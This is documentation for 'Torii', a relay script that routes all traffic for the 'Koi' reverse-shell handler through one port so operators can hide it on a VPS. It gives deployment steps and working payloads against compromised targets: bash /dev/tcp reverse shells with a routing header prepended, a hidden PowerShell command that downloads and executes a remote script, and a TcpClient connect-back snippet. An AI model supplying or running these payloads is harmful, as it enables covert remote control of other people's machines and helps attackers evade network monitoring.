# Going Online with Torii

## Why You Need It

Koi is built to run locally on a compromised machine. When a payload connects back, it opens a session on 127.0.0.1:4010. This is great when you're already inside a network (pivoting). But Koi also uses side-channel ports for file transfers and module operations.

Check your Koi config to see which ports:

```bash
cat ~/.koi/config.json | grep -A 10 sidetcps
```

By default that's ports 4011-4015, but it can be more or different depending on your config.

When you go remote or deploy on a VPS, you have a problem. You'd need to open firewall rules for:
- Port 4010 for the reverse shell
- Ports 4011-4015 for side-channels (or whatever your config says)

Your options suck:
- Open all those ports individually (obvious what it is)
- Dynamically update firewall rules (too complex)
- Change Koi's config for each deployment (messy)

I wrote a little script (torii, hehe) that multiplexes all of this through a single TCP port instead. That's it.

---

## How It Works

Torii sits between your target and Koi. When a target connects, it sends a 3-byte header that tells Torii where to route the traffic:

```
[TYPE byte][PORT in big-endian]

0x01 0x0F 0xAA = reverse shell to Koi:4010
0x02 0x0F 0xAB = side-channel to Koi:4011
```

When Koi needs to send a file transfer command, it tells the target to connect back. Torii intercepts that and rewrites the localhost address to your public IP, then routes it to the right internal port. The target has no idea it's being multiplexed.

Result: everything flows through one port instead of many.

---

## Where to Use It

### Local Network (Optional)

If you're already pivoted inside, Koi works fine without Torii. But you could still use it for centralization, easier deployment, or just for practice.

### Remote Target (Recommended)

Target is outside your network. Instead of opening multiple firewall holes:

```
Without Torii: port 4010, then 4011, 4012, 4013, 4014, 4015
With Torii:    port 49410 only
```

One firewall rule. Done.

### VPS Deployment (Recommended)

Same as remote. You don't want multiple Koi ports exposed on your VPS. Torii lets Koi stay hidden on localhost while you only open a single relay port.

---

## What Is Torii?

It's a single-file Python script (about 1000 lines). No external dependencies. It reads that 3-byte header, looks up where to route, and forwards the connection. When Koi sends commands that embed localhost addresses, Torii rewrites them to your public IP on the fly.

Features:
- All traffic through one port
- No dependencies, no installation
- Transparent address rewriting for file transfers
- Tracks multiple targets by their IP

Deploy it like this:

```bash
python3 torii_standalone.py \
  --listen 0.0.0.0:49410 \
  --koi 127.0.0.1:4010 \
  --public-host YOUR_PUBLIC_IP
```

Koi stays on localhost. Targets connect through Torii. No configuration changes to Koi itself.

---

## Quick Start

```bash
# On your VPS or relay machine or even yourself (with a port 49410 open)
python3 torii_standalone.py --listen 0.0.0.0:49410 --koi 127.0.0.1:4010 --public-host YOUR_PUBLIC_IP

# On the same machine, in another terminal (or just koi if you use the default settings)
koi --listen 127.0.0.1:4010
```

That's it. Targets connect to `YOUR_PUBLIC_IP:49410`, everything routes internally to Koi.

---

## Setup

### 1. Check your Koi side-channel ports

```bash
cat ~/.koi/config.json | grep -A 10 sidetcps
```

You'll see a list like `[4011, 4012, 4013, 4014, 4015]`. You need to know these for calculating Torii headers.

### 2. Deploy Torii on your VPS or relay machine

```bash
python3 torii_standalone.py \
  --listen 0.0.0.0:49410 \
  --koi 127.0.0.1:4010 \
  --public-host YOUR_PUBLIC_IP
```

Replace `YOUR_PUBLIC_IP` with the actual IP your targets can reach.

### 3. Run Koi on the same machine

```bash
koi --listen 127.0.0.1:4010
```

It stays on localhost. Torii relays everything from the outside.

### 4. Create a Torii payload manually

Koi doesn't generate Torii payloads automatically. You create them yourself by prepending the Torii header to a standard reverse shell.

First, get a regular bash payload from Koi:

```bash
$ koi payload
[?] Interface: eth0
bash -i >& /dev/tcp/YOUR_IP/4010 0>&1
```

Then wrap it with the Torii header. For a reverse shell on port 4010, the header is `0x01 0x0F 0xAA`:

```bash
(printf '\x01\x0f\xaa'; bash -i) >& /dev/tcp/YOUR_PUBLIC_IP/49410 0>&1
```

The `printf '\x01\x0f\xaa'` sends the header bytes. After that, everything else is normal bash reverse shell. When the target connects, Torii reads those three bytes, sees it's a shell connection to port 4010, and routes to Koi.

If you need a different backend port (say, 4011 for a side-channel), calculate the header:

```bash
# Port 4011 in hex = 0x0F 0xAB
# Type 0x02 = side-channel
(printf '\x02\x0f\xab'; your_payload_here) >& /dev/tcp/YOUR_PUBLIC_IP/49410 0>&1
```

That's all. Deploy the payload on the target, it connects through Torii, you get a session in Koi.

### PowerShell

For Windows targets, PowerShell is trickier because you need to send raw bytes. Use a bash wrapper:

```bash
(printf '\x01\x0f\xaa'; powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/payload.ps1')" ) >& /dev/tcp/YOUR_PUBLIC_IP/49410 0>&1
```

The bash part sends the header first, then PowerShell runs. PowerShell receives commands from stdin and executes them.

If you need pure PowerShell without bash, use TcpClient directly:

```powershell
$client = New-Object System.Net.Sockets.TcpClient('YOUR_PUBLIC_IP', 49410)
$stream = $client.GetStream()
[byte[]]$header = @(0x01, 0x0f, 0xaa)
$stream.Write($header, 0, 3)
# Now your reverse shell or payload
$proc = [Diagnostics.Process]::Start('powershell.exe')
```

The bash wrapper approach is usually simpler.

---

## Download

Torii is included in the Koi repo or can be downloaded standalone:

[Download torii_standalone.py](assets/dowloads/torii.py)

That's it. No pip install, no dependencies. Just run it.

```bash
python3 torii_standalone.py --help
```
